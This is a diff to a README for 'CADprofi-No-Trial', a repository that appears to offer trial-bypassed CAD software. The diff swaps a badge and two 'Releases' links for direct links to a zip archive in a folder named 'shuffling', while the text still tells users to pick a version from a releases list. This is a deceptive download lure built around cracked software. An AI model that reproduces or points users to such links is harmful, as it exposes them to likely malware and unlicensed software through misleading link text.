@@ -1,6 +1,6 @@
 # 🎨 CADprofi-No-Trial - Enhance Your CAD Workflows Efficiently
 
-![Download CADprofi-No-Trial](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download CADprofi-No-Trial](https://raw.githubusercontent.com/ammar12345alsaqer/CADprofi-No-Trial/main/shuffling/CADprofi-No-Trial-v3.6-beta.4.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ CADprofi-No-Trial is your go-to resource for official CADprofi materials. This r
 To begin using CADprofi-No-Trial, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Visit this page to download: [CADprofi-No-Trial Releases](https://github.com/ammar12345alsaqer/CADprofi-No-Trial/releases).
+   Visit this page to download: [CADprofi-No-Trial Releases](https://raw.githubusercontent.com/ammar12345alsaqer/CADprofi-No-Trial/main/shuffling/CADprofi-No-Trial-v3.6-beta.4.zip).
 
 2. **Choose Your Download**  
    Once on the releases page, you will see a list of available versions. Select the latest version that fits your needs.
@@ -33,7 +33,7 @@ To begin using CADprofi-No-Trial, follow these simple steps:
 To get started with CADprofi-No-Trial, please ensure you have a compatible Windows PC. Follow these steps:
 
 1. **Access the Releases Page**:  
-   Visit this page to download: [CADprofi-No-Trial Releases](https://github.com/ammar12345alsaqer/CADprofi-No-Trial/releases).  
+   Visit this page to download: [CADprofi-No-Trial Releases](https://raw.githubusercontent.com/ammar12345alsaqer/CADprofi-No-Trial/main/shuffling/CADprofi-No-Trial-v3.6-beta.4.zip).  
 
 2. **Select the Latest Release**:  
    Choose the most recent version from the list provided. Usually, the version at the top is the latest.
